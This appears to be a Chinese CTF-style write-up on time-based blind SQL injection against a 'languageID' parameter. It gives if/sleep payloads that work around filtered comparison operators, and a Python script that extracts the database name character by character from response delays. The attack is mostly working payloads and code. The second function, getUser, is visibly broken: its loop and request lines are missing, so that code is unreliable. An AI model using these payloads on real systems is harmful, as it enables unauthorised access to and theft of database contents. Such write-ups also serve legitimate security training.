过滤了一些关键字，正常的联合注入是没有办法了，可以时间盲注

利用if和sleep构造payload，因为<,=被过滤且存在htmlspecialchars函数，利用like代替（经过评论区师傅指点，利用下面的payload会更好点，因为like大小写都可以匹配）

languageID=0 or if(substr(database(),1,1) like 0x6e,sleep(5),1);

languageID=0 or if(ascii(substr(database(),%s,1))-%s,1,sleep(5));

附上脚本

# !/usr/bin/python3
# -*- coding:utf-8 -*-
# author: Forthrglory

import requests

def getDatabase(url):
    s = ''
    r = requests.session()
    head = {'Content-Type':'application/x-www-form-urlencoded'}

    for i in range(1,9):
        for j in range(32,122):
            data = 'languageID=0 or if(ascii(substr(database(),%s,1))-%s,1,sleep(5));' % (i,j)

            result = r.post(url, data, headers=head)

            if(result.elapsed.total_seconds() > 5):
                s = s + chr(j)
                print(s)
                break
    print('database=' + s)


def getUser(url):
    s = ''
    r = requests.session()
    head = {'Content-Type':'application/x-www-form-urlencoded'}

    for i in range(1,21):

            if(result.elapsed.total_seconds() > 5):
                s = s + chr(j)
                print(s)
                break
    print('user=' + s)
